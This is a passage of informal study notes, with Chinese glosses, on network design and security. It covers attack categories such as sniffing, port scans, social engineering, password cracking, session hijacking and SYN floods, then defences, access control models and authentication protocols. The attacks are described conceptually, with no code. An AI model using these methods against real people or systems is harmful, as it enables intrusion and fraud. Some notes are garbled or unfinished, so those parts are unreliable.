evenly across the three floors (each floor contains
approximately 67 hosts).
Therefore, each floor will have a wiring closet containing two
Ethernet switches:
▸ one 48-port density switch ▸ one 24-port density switch.
- Each switch is connected to a multilayer switch located in building A, using four connections, logically bundled together using Link Aggregation Control Protocol (LACP).
- Within building B:
◦ two Ethernet switches, each with 48 ports,
◦ one Ethernet switch, with 24 ports
◦ installed in a wiring closet.
- These switches are interconnected in a stacked configuration, using four connections, logically bundled together using LACP.
- One of the switches has a MMF port, which allows it to connect via
fiber to building A’s multilayer switch.
◦ Building : Quantity of 48-Port Switches : Quantity of 24-Port Switches
◦ A:3:3 ◦ B:2:1
Layer 3 Devices
- when selecting Layer 3 devices for a network:
◦ How many interfaces are needed (now and in the future)?
◦ What types of interfaces need to be supported (now and in the
future)?
◦ What routing protocol(s) need to be supported?
◦ What router features (like HSRP or security features) need to be
supported?
- Layer 3 devices consist of ◦ All switches within building A home back to the multilayer switch using four LACP-bundled links.
- The multilayer switch is equipped with at least one MMF port, which allows connect to Ethernet switches in building B.
- The multilayer switch connects to a router via a FastEthernet connection.
- This router contains a serial interface, which connects to the Internet via a T3 connection.
Wireless Design
- when designing the wireless portion of a network:
◦ What wireless speeds need to be supported (now and in the
future)?
◦ What distances need to be supported between wireless devices and
wireless access points (now and in the future)?
◦ What IEEE wireless standard(s) needs to be supported?
◦ What channel(s) should be used?
◦ Where should wireless access points be located?
- Because the network needs to support various Wi-Fi clients, the 2.4 GHz band is chosen,
◦ because it is the most commonly used band.
- Within building A, a wireless access point (AP) is placed on each floor
of the building.
◦ To avoid interference, the non overlapping channels of 1, 6, and 11
are chosen.
◦ The 2.4 GHz band also allows compatibility with IEEE 802.11 b/g/
n.
- Within building B, a single wireless AP accommodates Wi-Fi clients.
Environmental Factors
- when considering environmental factors of a network:
◦ What temperature or humidity controls exist in the rooms
containing network equipment?
◦ What power redundancy system(s) is needed to provide power to
network equipment in the event of a power outage?
- Because the multilayer switch in building A could be a single point of
failure for the entire network, the multilayer switch is placed in a well-ventilated 通⻛良好 room,
◦ help dissipate heat in the event of an air conditioning failure. - To further enhance the availability of the multilayer switch, the switch is connected to a UPS,
◦ help the multilayer switch continue to run, for a brief time, in the event of a power outage.
◦ Protection against extended power outage: the addition of a generator发电机.
▸ However, no generator is included in this design because of budgetary reasons.
Cost Savings Versus Performance
- When assimilating 消化 all the previously gathered design elements, you need to;
◦ weigh budgetary constraints against network performance metrics.
- Example, Gigabit Ethernet was chosen over 10 Gigabit Ethernet.
- Additionally, the link between building A and building B could
become a bottleneck 瓶颈,
- because it runs at a speed of 1 Gbps, although it transports an
aggregation of multiple 1 Gbps.
- However, cost savings are achieved through using 1 Gbps switch
interfaces as opposed to 10 Gbps interfaces or a bundle of multiple 1 Gbps fiber links.
Topology
- the topology of the proposed design based on the collection of previously listed design decisions. Define Key Terms
- availability, reliability,
- Common Address Redundancy Protocol (CARP),
- uninterruptible power supply (UPS),
- latency, jitter, integrated services (IntServ), differentiated services,
classification, marking, congestion management, congestion
avoidance,
- policing, traffic shaping,
- committed information rate (CIR),
- link efficiency Categories of Network Attacks
Categories of Network Attacks
- confidentiality, integrity, and availability, 3 primary goals of network security.
- the types of attacks that attempt to compromise these areas.
Confidentiality Attacks
- confidentiality attack: make confidential data viewable by an attacker. (like records, usernames, passwords or e-mails)
- Because an attacker often makes a copy of the data, rather than trying to manipulate the data or crash a system, confidentiality attacks often go undetected.
- Even if auditing software to track file access were in place, if no one suspected an issue, the audit logs might never be examined.
- example:
◦ a web server and a database server have a mutual trust
relationship. The database server houses confidential customer
information (like customer credit-card information).
◦ As a result, company A decided to protect the database server
(example, patching known software vulnerabilities) better than
the web server.
◦ However, the attacker leverages the trust relationship between the
two servers to obtain customer credit-card information and
 then make a purchase from company B using the stolen credit- card information. The procedure is as follows:
▸ The attacker exploits a vulnerability 弱点 in company A’s web server and gains control of it.
▸ The attacker uses the trust relationship between the web server and the database server to obtain customer credit- card information from the database server.
▸ The attacker uses the stolen credit-card information to make a purchase from company B.
- several methods for confidentiality attack:
- Packet capture/sniffing
◦ Use (like Wireshark), capture packets visible by a PC’s network
interface card (NIC), by placing the NIC in promiscuous mode.
◦ Some protocols (like Telnet and HTTP) are sent in plain text.
◦ Therefore, these types of captured packets can be read by an
attacker, perhaps allowing the attacker to see confidential
information.
- Ping sweep / port scan
◦ A confidentiality attack might begin with a scan of network resources to identify attack targets on a network.
◦ A ping sweep 扫视;袭击 could be used to ping a series of IP addresses.
◦ Ping replies might indicate to an attacker that network resources were reachable at those IP addresses.
◦ After a collection of IP addresses is identified, the attacker might scan a range of UDP and/or TCP ports to see what services are available on the hosts at the specified IP addresses.
◦ Also, port scans often help attackers identify: the operating system running on a target system.
- Dumpster diving 垃圾装卸卡⻋
◦ companies throw away confidential information, without proper
shredding,
◦ some attackers rummage through company dumpsters in hopes of
discovering information that could
◦ be used to compromise network resources.
- Electromagnetic interference (EMI) interception
◦ Because data is often transmitted over wire (like unshielded twisted pair),
◦ attackers can sometimes copy information traveling over the wire, by intercepting the electromagnetic interference (EMI) being •
•
emitted 发散 by the transmission medium.
◦ These EMI emissions are sometimes called emanations.
Wiretapping 窃听装置
◦ If an attacker gains physical access to a wiring closet,
◦ he might physically tap into telephone cabling to eavesdrop on
telephone conversations,
◦ or he might insert a shared media hub in-line with a network cable,
allowing an attacker to connect to the hub and receive copies of
packets flowing through the network cable.
Social engineering
◦ Attackers sometimes use social techniques to obtain confidential information.
◦ Example, an attacker might pose as a member of an organization’s IT department and ask a company employee for his login credentials in order for the “IT staff to test the connection.”
▸ Pretexting :
- attack based on invented story or pretext.
- Example: answer other's question to reset password.
▸ Baiting:
- using some kind of “gift” as a bait to get someone to
install malicious software.
- Example: an attacker could leave a USB, someone pick up
and unwittingly install the malicious software.
▸ Quid Pro Quo:
- Latin for “something for something.” - Example:
◦ one sharing her password in return for his “free” help.
◦ To increase the chances of succeeding in his attack, use a voice- over-IP (VoIP) telephone service that allows for caller-ID spoofing. Thus, he could
supply as his caller-ID the phone number and
name of the actual helpdesk for Alice’s company.
◦ This is an instance of another type of attack called
vishing, which is short for VoIP phishing.
Sending information over overt channels 明显的
◦ An attacker might send/receive confidential information over a
network using an overt channel.
◦ example:
◦ tunneling one protocol inside another: like sending instant- messaging traffic via HTTP.
- ◦ Steganography 隐写术 : like sending a digital image with millions of pixels, “secret” information encoded in specific pixels, only the sender and the receiver know which pixels represent the encoded information.
- Sending information over convert channels
◦ An attacker might send/receive confidential information over a network using a convert channel, which can communicate information as a series of codes and/or events.
◦ example:
▸ binary data could be represented by sending a series of pings
to a destination.
▸ A single ping within a certain period of time could represent a
binary 0, while two pings within that same time period
represented a binary 1.
- FTP bounce
◦ FTP supports a variety of commands for setting up a session and managing file transfers.
◦ One of these commands is the PORT command, and it can, in some cases, be used by an attacker to access a system that would otherwise deny the attacker.
◦ Specifically, an attacker connects to an FTP server using the standard port of 21.
◦ However, FTP uses a secondary connection to send data.
◦ The client issues a PORT command to specify the destination port
and destination IP address for the data transmission.
◦ Normally, the client would send its own IP address and an
ephemeral 瞬息的 port number.
◦ The FTP server would then use a source port of 20 and a
destination port specified by the client when sending data to
the client.
◦ However, an attacker might issue a PORT command specifying the
IP address of a device they want to access, along with an open
port number on that device.
◦ As a result, the targeted device might allow an incoming
connection from the FTP server’s IP address, while a connection coming in from the attacker’s IP address would be rejected.
◦ Fortunately, most modern FTP servers do not accept the PORT command coming from a device that specifies a different IP address than the client’s IP address. Integrity Attacks
- Integrity attacks: alter data (compromise the integrity of the data).
- man-in-the-middle attack:
◦ a network stream is intercepted, modified, and retransmitted, and computer viruses, which modify critical system files so as to perform some malicious action and to replicate themselves..
- Salami attack:
◦ a collection of small attacks, result in a larger attack when combined.
◦ Example:
◦ attacker had a collection of stolen credit-card numbers
◦ the attacker withdraw small amounts from each credit card
(possibly unnoticed by the card holders).
◦ Although each individual withdrawal was small, the combination
of the multiple withdrawals results in a significant sum for the
attacker.
- Data diddling:
◦ change data before it is stored in a computing system.
◦ Malicious code in an input application or a virus could perform
data diddling.
◦ Example:
◦ a virus, Trojan horse, worm could be written to intercept keyboard input
◦ while displaying the appropriate characters onscreen (so the user does not see an issue), manipulated characters could be entered into a database application or sent over a network.
 - A
- A
virus: is a piece of code (like a program or a script) that an end user executes.
worm蠕虫: can infect a system or propagate to other systems without any intervention from the end user. - a Trojan horse: is a program that appears to be for one purpose (like game), but secretly performs another task (like collecting a list of contacts from an end user’s e-mail program).
- Trust relationship exploitation:
◦ Different devices in a network might have a trust relationship between themselves.
◦ example:
◦ a certain host might be trusted to communicate through a firewall
using specific ports, while other hosts are denied passage
through the firewall using those same ports.
▸ If an attacker were able to compromise the host that had a
trust relationship with the firewall, then the attacker could use the compromised host to pass normally denied data through a firewall.
◦ a web server --- a database server mutually trusting one another. ▸ if an attacker gained control of the web server,
▸ he might be able to leverage that trust relationship to
compromise the database server.
- Password attack:
◦ attempts to determine the password of a user.
◦ Once the attacker gains the username and password credentials.
◦ he can attempt to log into a system as that user and inherit that
user’s set of permissions.
◦ Various approaches are available to determine passwords.
▸ if a password is an arbitrary string of at least eight printable characters.
▸ then the number of potential passwords is at least 94^8 = 6 095 689 385 410 816, that is, at least 6 quadrillion.
▸ Even if a computer could test one password every nanosecond, faster than any computer could, then it would take, on average, at least 3 million seconds to break one such password, that is, at least 1 month of nonstop attempts.
◦ Example:
▸ Trojan horse:
- a program that appears to be a useful application, but
might capture a user’s password and then make it
available to the attacker.
▸ Packet capture: - a utility can capture packets seen on a PC’s NIC.
- If the PC can see a copy of a plain-text password being
sent over a link, the packet-capture utility can be used
to glean the password.
▸ Keylogger:
- A program that runs in a computer’s background, and it
logs keystrokes that a user makes.
- after a user enters a password, the password is stored in
the log created by the keylogger.
- An attacker can then retrieve the log of keystrokes to
determine the user’s password.
▸ Brute force Decryption Attack:
- This attack tries all possible password combinations until
a match is made.
- Example:
- valid messages, English text of up to t characters
◦ with the standard 8-bit ASCII encoding
▸ n = 8:
▸ a t-byte array.
▸ the total number of possible t-byte arrays: (2^8)^t
= 2^n.
▸ a message is a binary string of length n = 8t
◦ But, each character of English text carries about 1.25 bits of information
▸ the number of t-byte arrays that correspond to English text: (2^1.25)^t = 2^1.25t.
▸ the bit length n, the number of n-bit arrays corresponding to English text is approximately 2^0.16n.
◦ 待细看
◦ the brute-force attack might start with the letter a and
go through the letter z.
◦ Then, the letters aa through zz are attempted, until the
password is determined.
◦ Therefore, using a mixture of upper- and lowercase, in
addition to special characters and numbers, can
help mitigate a brute-force attack.
▸ Dictionary attack:
- Similar to a brute-force attack, multiple password guesses
are attempted. - the dictionary attack is based on a dictionary of commonly used words, rather than the brute-force method of trying all possible combinations.
◦ Example, English language, there are less than 50,000 common words, 1,000 common human first names, 1,000 typical pet names, and 10,000 common last names. In addition, there are only 36,525 birthdays and anniversaries for almost all living humans on the planet, that is, everyone who is 100 years old or younger.
◦ So an attacker can compile a dictionary of all these common passwords and have a file that has fewer than 100,000 entries.
- If an attcker can try the words in his dictionary at the full speed of a modern computer, he can attack a password-protected object and break its protections in just a few minutes.
◦ if a computer can test one password every millisecond, which is probably a gross overestimate for a standard computer with a clock speed of a gigahertz,
◦ then it can complete the dictionary attack in 100 seconds, which is less than 2 minutes.
- Picking a password that is not a common word helps mitigate a dictionary attack.
▸ Botnet 僵尸网络:
- A software robot is typically thought of as an application
on a machine that can be controlled remotely (like a
Trojan horse or a backdoor in a system).
- If a collection of computers are infected with such
software robots, called bots, this collection of
computers is called a botnet (zombie).
- Because of the potentially large size of a botnet, it might
compromise the integrity of a large amount of data.
▸ Hijacking a session: 劫持
- An attacker could hijack a TCP session, - Example:
◦ by completing the third step in the three-way TCP handshake process between an authorized client and a protected server. ◦ If an attacker successfully hijacked a session of an authorized device, he might be able to maliciously manipulate data on the protected server.
Availability Attacks
- attempt to limit the accessibility and usability of a system.
- Availability attacks vary widely,
◦ consume the processor or memory resources on a target system, that system might be unavailable to legitimate users.
◦ doing physical damage to that system.
- various availability attacks:
◦ Denial of Service (DoS)
▸ sending the target system a flood of data or requests that consume the target system’s resources.
▸ some operating systems (OS) and applications might crash when they receive specific strings of improperly formatted data,
▸ attacker could leverage such OS/application vulnerabilities to render a system/ application inoperable.
▸ The attacker often uses IP spoofing to conceal his identity when launching a DoS attack.
◦ Distributed Denial of Service (DDoS)
▸ DDoS attacks can increase the amount of traffic flooded to a target system.
▸ an attacker compromises multiple systems (zombies), which can be instructed by attacker to simultaneously launch a DDoS attack against a target system.
◦ TCP SYN Flood
▸ One variant of a DoS attack
▸ the attack can send multiple SYN segments to a target system with false source IP addresses in the header of the SYN segments.
▸ Can never complete the three-way TCP handshake. 3,096

▸ Because many servers limit the number of TCP sessions they can have open simultaneously,
▸ a SYN flood can render a target system incapable, can not open a TCP session with a legitimate user.
◦ Buffer Overflow
▸ Buffer: a area of memory, a computer program that has been given a dedicated area of memory to which it can write.
▸ Buffer overflow: a program attempts to write more information than the buffer can accommodate.
- Injects code written by a malicious user into a running app.
- Exploiting the common programming error of not checking whether an input string read by the app is larger than buffer (the variable into which it is stored).
▸ If permitted to do so, the program can fill up its buffer and then have its output spill over into the memory area being used for a different program.
▸ This could potentially cause the other program to crash.
▸ Some programs are known to have this vulnerability (the characteristic of overrunning their memory buffers) and can be exploited by attackers.
◦
Electrical Disturbances
  - an attacker could launch an availability attack by interrupting or interfering with the electrical service available to a system.
- Example,
- if attacker gained physical access to a data center’s electrical system,
he might be able to cause a variety of electrical disturbances, such as the following:
◦ Power spikes ⻓钉: Excess 过度 power for a brief period of time
◦ Electrical surges: Excess power for an extended period of time
◦ Power fault: A brief electrical outage
◦ Blackout: An extended electrical outage
◦ Power sag 下陷: A brief reduction in power
◦ Brownout: An extended reduction in power
- To combat such electrical threats:
- install uninterruptible power supplies (UPS) and generator backups
for strategic devices in your network.
- routinely test the UPS and generator backups.
◦ A standby power supply (SPS) is a lower-end version of a UPS.
◦ Although it’s less expensive than a traditional UPS, an SPS’ battery
is not in-line with the electricity coming from a wall outlet.
◦ Instead, an SPS’ battery operates in parallel with the wall power,
standing by in the event that the wall power is lost.
◦ Because of this configuration, there is a brief period of time
between a power outage and the SPS taking over, which could result in the attached equipment shutting down.
Attacks on a System’s Physical Environment
- Attackers could also intentionally damage computing equipment by influencing the equipment’s physical environment. example, attackers could attempt to manipulate such environmental factors as the following: ◦ Temperature: computing equipment generates heat (like in data centers or server farms), attacker can interferes with the operation of an air-conditioning system, the computing equipment could overheat.
◦ Humidity: computing equipment is intolerant of moisture, attacker can cause physical damage to computing equipment by creating a high level of humidity in computing environment.
◦ Gas: Because gas can often be flammable 可燃的, attacker can injects gas into a computing environment, small sparks in that environment could cause a fire.
- Consider the following recommendations to mitigate 减轻 such environmental threats:
◦ Computing facilities should be locked (and not accessible via a drop ceiling, a raised floor, or any other way other than a monitored point of access).
◦ Access should require access credentials (like via a card swipe or a bio- metric scan).
◦ Access points should be visually monitored (like via local security pesonnetnel or remotely via a camera system).
◦ Climate control systems should maintain temperature and humidity, and send alerts if specified temperature or humidity thresholds are exceeded.
◦ The fire detection and suppression systems should be designed not to damage electronic equipment.
1.4 Security Principles
 - security principles: 1975 paper by Saltzer and Schroeder.
- The Ten Security Principles:
◦ Economy of mechanism:
▸ simplicity the design and implementation of security measures.
◦ Fail-safe defaults.
▸ the default configuration of a system should have a conservative protection scheme.
▸ if no access rights are explicitly specified for a certain subject-object pair (s, o) (like access control matrix), then all types of access to object o are denied for subject s.
◦ Complete mediation 调解:
▸ every access to a resource must be checked for compliance with a protection scheme.
▸ it can be risky if permissions are checked the first time a program requests access to a file, but subsequent accesses to the same file are not checked again while the application is still running.
▸ Example:
- online banking web site, 15 minutes, has elapsed
◦ Open design:
▸ the security architecture and design of a system should be made publicly available.
▸ allows for a system to be scrutinized by multiple parties, early discovery and correction of security vulnerabilities caused by design errors.
•
security by obscurity:
◦ opposite of Open design, known a tries to achieve
security by keeping cryptographic algorithms secret has been historically used without success by several organizations.
◦ Separation of privilege.
▸ multiple conditions should be required to achieve access to restricted resources or have a program perform some action.
▸ limit the damage caused by a security breach of any individual component.
◦ Least privilege: ▸ Each program/user should operate with the bare minimum privileges necessary to function.
- need-to-know: the military concept.
◦ Least common mechanism.
▸ systems with multiple users, mechanisms allowing resources to be shared by user should be minimized.
◦ Psychological acceptability.
▸ user interfaces should be well designed and intuitive 有直觉 力的,
▸ all security-related settings should adhere to what an ordinary user might expect.
◦ Work factor.
▸ the cost of circumventing a security mechanism should be compared with the resources of an attacker when designing a security scheme.
◦ Compromise recording.
▸ record the details of an intrusion than to adopt more sophisticated measures to prevent it. Defending Against Attacks
Defending Against Attacks
User Training
- Many attacks require user intervention in order to be carried out.
◦ execute an application containing a virus before the virus takes any
action.
◦ user give sensitive information (such as username and password
credentials), attacker access the user’s account.
- several potential attacks can be thwarted 挫败 through effective user training
◦ Never give out your password.
◦ Do not open e-mail attachments from unknown sources.
◦ Select strong passwords, consisting of at least eight characters and
containing a mixture of alphabetical (upper- and lowercase),
numeric, and special characters.
◦ Change your passwords monthly.
Patching 补丁
- Some attacks are directed at vulnerabilities known to exist in various
OSs and applications.
- As these vulnerabilities are discovered, the vendors of the OSs or
applications often releasing a patch.
◦ A patch: designed to correct a known bug or fix a known
vulnerability in a piece of software.
◦ patch is different from update (fixing known bug or vulnerability +
more features to the software)
- network administrators should implement patches as they become
available.
Security Policies
- One of the main reasons security breaches occur within an organization is:
◦ The lack of a security policy
◦ The lack of effectively communicating/enforcing that security
policy to all concerned.
- A security policy: ◦ a continually changing document that dictates a set of guidelines, specifying rules for how a network is used.
◦ main purpose: protect the assets.
▸ include more than just tangible items)
▸ also entail things such as intellectual property, processes and
procedures, sensitive customer data, and specific server
functions (like e-mail or web functions).
◦ Also serveses other purposes, such as the following:
▸ Making employees aware of their obligations in regard to security practices
▸ Identifying specific security solutions required to meet the goals of a security policy
▸ Acting as a baseline for ongoing security monitoring
- One of the more well-known components of a security policy is an
AUP:
◦ acceptable/appropriate use policy (AUP)
◦ identifies what users of a network are and are not allowed to do on
a network.
▸ Example: watch tv during working hours via an organization’s Internet connection might be deemed inappropriate by an AUP.
◦ an organization, various categories of employees (like management, technical staff, and end users), a single document might not be sufficient.
▸ Example: managerial personnel might not be concerned with the technical intricacies of a security policy. However, the technical personnel might be less concerned with why a policy is in place, while end users might be more likely to comply with the policy if they did understand the reasoning behind the rules.
- Therefore, a security policy might be a collection of congruent 叠合的 yet separate documents.  Governing Policy
- At a very high level, addresses security concepts deemed important to an organization.
- primarily targeted toward managerial and technical employees.
- The following are typical elements of a governing policy:
◦ Identification of the issue addressed by the policy
◦ Discussion of the organization’s view of the issue
◦ Examination of the relevance of the policy to the work
environment
◦ Explanation of how employees are to comply with the policy
◦ Enumeration 列举 of appropriate activities, actions, and processes
◦ Explanation of the consequences of noncompliance
- You might want to consult with your company’s legal counsel when
formulating a governing policy.
Technical Policies
- provide a more detailed treatment of an organization’s security policy, as opposed to the governing policy.
- Typical components of technical policies include specific duties of the security and IT in areas like:
◦ E-mail
◦ Wireless networks
◦ Remote access - intended target of these technical policies: Security and IT personnel, and these personnel use these policies in performing their day-to- day tasks.
End User Policies
- address security issues and procedures relevant to end users. - Example,
◦ an end user might be asked to sign an AUP for Internet access.
◦ That AUP might state that Internet access is only for business
purposes.
◦ Then, if an end user is found using the Internet for personal
reasons, she could face the consequences out- lined in the governing policy.
More Detailed Documents
- Governing/Technical/End user policies each target a relatively large population of personnel, these policies tend to be general in nature.
- However, a comprehensive security policy requires a highly granular treatment of an organization’s procedures. Therefore, more detailed documents are often contained in a security policy:
◦ Standards:
▸ Standards support consistency 一致性 within a network.
▸ Example:
- a standard might specify a limited number of OSs to be
supported in the organization,
- because it would be impractical for the IT staff to support
any OS that a user happened to select.
- Also, standards could apply to configuring devices, like
routers having a standardized routing protocol.
◦ Guidelines:
▸ standards: mandatory 强制的 practices
▸ guidelines: suggestions
▸ Example, a series of best practices might constitute a security
policy’s guidelines.
◦ Procedures: 规程
▸ To support consistency in a network, and as dictated by the previously mentioned standards, a security policy might include a collection of procedures.
▸ detailed documents that provide step-by-step instructions for completing specific tasks (like configure port security on an Ethernet switch).
- This list is not comprehensive, you need to create a set of documents
to match the security needs of your company.
Incident Response
- How an organization reacts to a security violation
- Many deterrent controls might display warnings such as, “Violators will be prosecuted to the fullest extent
- of the law.”
- to successfully prosecute 检举 an attacker, require following elements to present an effective argument:
◦ Motive:
▸ A motive describes why the attacker committed the act. ▸ potential motives can be valuable to define during an
investigation.
▸ an investigation might begin with those that had a motive to
carry out the attack.
- Example: disgruntled employee?
◦ Means:
▸ With all the security controls in place to protect data or computer systems, you need to determine if the accused had the means (like technical skills) to carry out the attack.
◦ Opportunity:
▸ whether the accused had the opportunity to commit an attack
- Another challenge with prosecuting computer-based crime stems from
the fragility 虚弱 of data.
◦ A timestamp can easily be changed on a file without detection.
- To prevent evidence tampering 窜改, strict policies and procedures for data handling must be followed.
◦ Example:
◦ before any investigative work is done on a computer system,
◦ Require multiple copies of a hard drive.
◦ One or more master copies could be locked up, and copies could be
given to the defense and prosecution for their investigation.
- Also, to verify the integrity of data since a security incident occurred, you need a chain of custody.
◦ documents who has been in possession of the data (evidence) since a security breach occurred. Vulnerability Scanners
components of your network-security solution might not behave as expected.
be aware of some of the vulnerabilities in your network devices. you should using applications designed to check and test for know
weaknesses.
  - vulnerability scanners.
  - Examples: Nessus and Nmap (network mapper).
Nessus
vulnerability scanning product from Tenable Network Security. features include:
  - Performing audits on systems without requiring an agent to be installed on the systems
  - Checking system configurations for compliance with an organization’s policy
  - Auditing systems for specific content (like credit-card information or adult content)
  - Performing continuous scanning, reducing time required to identify vulnerability.
  - Scheduling scans to run once, daily, weekly, or monthly 2 version of Nessus: home / busines.  Nmap
publicly available scanner features like:
  - Scanning and sweeping 扫除 features, identify services running on systems in a specified range of IP addresses.
  - Using a stealth approach to scanning and sweeping, making the scanning and sweeping less detectible by hosts and IPS technology.
  - Using OS fingerprinting technology to identify an OS running on a target system (including a percentage of confidence that the OS was correctly detected) Figure 12-10 illustrates a GUI version of Nmap, where a collection of host IP addresses are scanned for open ports, in addition to a variety of other fingerprinting operations.
2 Access Control Models
2.1 Access Control Matrices
- useful tool for determining access control rights.
- a table that defines permissions.
- subject: row of table (user, group, or system that can perform actions)
- object: column of table (file, directory, document, device, resource, or any
other entity for which we want to define access rights. )
- Access rights: actions like reading, writing, copying, executing, deleting,
and annotating.
◦ empty cell: no access rights are granted.
  - Advantages:
◦ fast and easy determination of the access control rights for any
subject-object pair.
◦ locating a record of interest can be done with a single operation of
looking up a cell in a matrix.
◦ simple, visual way of seeing the entire set of access control
relationships all at once, - Disadvantages:
◦ the lack of scalability: time and patience to fill in all the cells for a large table. 2.2 Access Control Lists
•
•
•
Access control lists (ACLs): rules that specify permitted and denied traffic. ◦ typically applied to router interfaces.
object-centered approach.
◦ for each such subject, s, gives the access rights that s has for object o.
▸ takes each column of the access control matrix
▸ compresses it into a list by ignoring all the subject-object pairs is
empty cells.
Although ACL features can vary by router vendor, examples of filtering criteria include:
◦ ◦ ◦
IP addresses (source or destination),
port number (source or destination),
and MAC addresses (source or destination).  - Advantages:
◦ much smaller than Access control matrix.
◦ ACL for an object can be stored directly with that object as part of its
metadata.
▸ the header blocks for files and directories can directly store the access control list of that file or directory.
▸ system need only consult the ACL of that object. - Disadvantages:
◦ don’t provide an efficient way to enumerate all the access rights of a given subject/user.
◦ search the access control list for every user requires a complete search
of all the ACLs in the system (sometimes necessary)
▸ a subject is to be removed from a system, the administrator needs
to remove his or her access rights from every ACL.
▸ the administrator has no choice but to search all the ACLs to find
any that contain that subject.
- Example:
- Figure 12-11, shows an ACL being applied to an interface on a Cisco IOS
router.
- This syntax tells the router interface of Serial 1/0/1 to permit incoming Telnet
and HTTP traffic from any source and destined for a network of
10.1.1.0/24.
- all the other traffic that attempts to enter interface Serial 1/0/1 is rejected. ◦ in the case of Cisco IOS routers, ACLs have an implicit (and invisible) deny all instruction. Then, any traffic not explicitly permitted is
rejected.
2.3 Capabilities
- subject-centered approach
- essentially a list of cells for each row in the access control matrix,
compressed to remove any empty cells. - Advantages:
◦ easy to quickly determine for any subject all the access rights that that subject has.
 - Disadvantages
◦ not associated directly with objects.
2.4 Role-Based Access Control (RBAC)
- Role Hierarchy 等级制度: administrators define roles and then specify access control rights for these roles, rather than for subjects directly.
- Example:
◦ have roles for faculty/student/administrative personnel/administrative
manager/backup agent...
◦ Each role grant the access rights that are appropriate for the user
associated with that role.
◦ The access rights for any subject are the union of the access rights for
the roles that they have. - Advantages:
◦ the total number of rules to keep track of is reduced. - Disadvantages:
◦ not implemented in current operating systems.
  Remote Access Security
- ACLs can permit or deny specific connections flowing through router/switch.
- you also need to control connections to network devices (like routers,
switches, or servers).
- a summary of these protocols and procedures:
- RAS:
◦ Microsoft Remote Access Server (RAS).
◦ the predecessor to Microsoft Routing and Remote Access Server
(RRAS).
◦ RRAS is a Microsoft Windows Server feature that allows Microsoft
Windows® clients to remotely access to a Microsoft Windows® network. - RDP:
◦ Remote Desktop Protocol (RDP)
◦ a Microsoft protocol that allows a user to view and control the desktop
of a remote computer.
◦ If RDP is misconfigured, a man in the middle attack could occur,
senstive information being captured.
- PPPoE :
◦ Point-to-Point Protocol over Ethernet (PPPoE)
◦ a commonly protocol between a DSL modem in home/business and a
service provider.
◦ PPPoE encapsulates PPP frames within Ethernet frames.
◦ This approach allows an Ethernet connection to leverage the features of PPP, like authentication.
- PPP:
◦ Point-to-Point Protocol (PPP)
◦ a common Layer 2 protocol
◦ offers features such as multilink interface, looped link detection, error
detection, and authentication.
- ICA:
◦ Independent Computing Architecture (ICA)
◦ a Citrix Systems proprietary protocol
◦ allows an application running on one platform (like Windows) to be
seen and controlled from a remote client, independent of the client platform (like UNIX).
- SSH:
◦ Secure Shell
◦ a protocol used to securely connect to a remote host (typically via a
terminal emulator).
- Kerberos: ◦ Supports mutual authentication between a client and a server.
◦ uses the concept of a trusted third party (a key distribution center) that
hands out tickets that are used instead of a username and password combination.
- AAA [server]
◦ Authentication, authorization, and accounting (AAA)
◦ allows a network to have a single repository of user credentials.
◦ A network administrator can then, example, supply the same credentials
to log onto various network devices (like routers and switches).
◦ RADIUS and TACACS+ are protocols commonly used to communicate
with a AAA server.
- RADIUS
◦ Remote Authentication Dial-In User Service (RADIUS)
◦ a UDP-based protocol used to communicate with a AAA server.
◦ Unlike TACACS+, RADIUS does not encrypt an entire authentication
packet, but only the password.
◦ However, RADIUS does offer more robust accounting features than
TACACS+.
◦ RADIUS is a open standards-based protocol.
◦ 1812-1813 - TACACS+
◦ Terminal Access Controller Access-Control System Plus (TACACS+)
◦ a TCP- based protocol used to communicate with a AAA server.
◦ encrypts an entire authentication packet, not only the password.
◦ TACACS+ does offer accounting features, but they are not as robust as
the accounting features found in RADIUS.
◦ a Cisco proprietary protocol.
◦ port.49 - NAC ◦ can permit or deny access to a network based on characteristics of the device seeking admission, rather than just checking user credentials.
◦ Example, a client’s OS and version of antivirus software could be
checked against a set of requirements before allowing the client to
access a network.
◦ This process of checking a client’s characteristics is called posture
assessment.
- IEEE 802.1X
◦ is a type of NAC that can permit or deny a wireless or wired LAN client access to a network.
◦ If IEEE 802.1X is used to permit access to a LAN via a switch port, then IEEE 802.1X is being used for port security.
◦ supplicant: The device seeking admission to the network.
◦ authenticator: The device to which the supplication connects (either
wirelessly or through a wired connection)
◦ authentication server: The device that checks the supplicant’s credentials
and permits or denies the supplicant to access the network.
◦ Usually, an authentication server is a RADIUS server.
- CHAP
◦ Challenge-Handshake Authentication Protocol (CHAP)
◦ performs a one-way authentication for a remote-access connection.
◦ However, authentication is performed through a three-way handshake
(challenge, response, and acceptance messages) between a server and
a client.
◦ The three-way handshake allows a client to be authenticated without
sending credential information across a network.
- MS-CHAP
◦ Microsoft Challenge-Handshake Authentication Protocol (MS-CHAP)
◦ a Microsoft-enhanced version of CHAP,
◦ offering a collection of additional features not present with CHAP,
including two-way authentication.
- EAP ◦ specifies how authentication is performed by an IEEE 802.1X.
◦ A variety of EAP types exist:
Extensible Authentication Protocol-Flexible Authentication via
Secure Tunneling (EAP- FAST),
◦ Extensible Authentication Protocol-Message Digest 5 (EAP-
MD5),
◦ Extensible Authentication Protocol-Transport Layer Security
(EAP-TLS).
  - - Require Deploying certificates to endpoint devices
◦
- Two-factor authentication
◦ Two-factor authentication (TFA)
◦ requires two types of authentication from a user seeking admission to a
network.
◦ Example:
◦ a user might have to know something (like password) and have
something (like fingerprint, which can be checked with a biometric
authentication device).
- Multifactor authentication
◦ multifactor authentication
◦ requires two or more types of successful authentication before granting
access to a network.
- Single sign-on
◦ Single sign-on (SSO)
◦ allows a user to authenticate only once to gain access to multiple
systems, without requiring the user to independently authenticate with each system.
Firewalls Firewall Types
- A firewall defines a set of rules to dictate which types of traffic are permitted
◦ ◦ ◦
◦ ◦ or denied as that traffic enters or exits a firewall interface.
- The actual firewall devices can be either a software or a hardware:
◦ Software firewall:
▸ A computer running firewall software, which can protect the computer itself (like preventing incoming connections to the computer).
▸ Alternately, a software firewall could be a computer with more than one NIC running firewall software.
▸ This type of software firewall could filter traffic attempting to pass through the computer
- coming in one of the NICs and leaving via a different NIC
◦ Hardware firewall:
▸ A network appliance that acts as a firewall.
▸ This appliance can have multiple interfaces for connecting to areas
of a network that require varying levels of security.
▸ The firewall checks the traffic against a set of firewall rules - permit or deny the traffic flows into or out of a firewall.
- Many firewalls also perform Network Address Translation (NAT) or Port Address Translation (PAT).
Potential Authentication / Access Problems
Authentication/access issues: transitive access client-side attacks.
Transitive Access
The word transitive means involving transition—keep this in mind as you learn how transitive access problems occur.
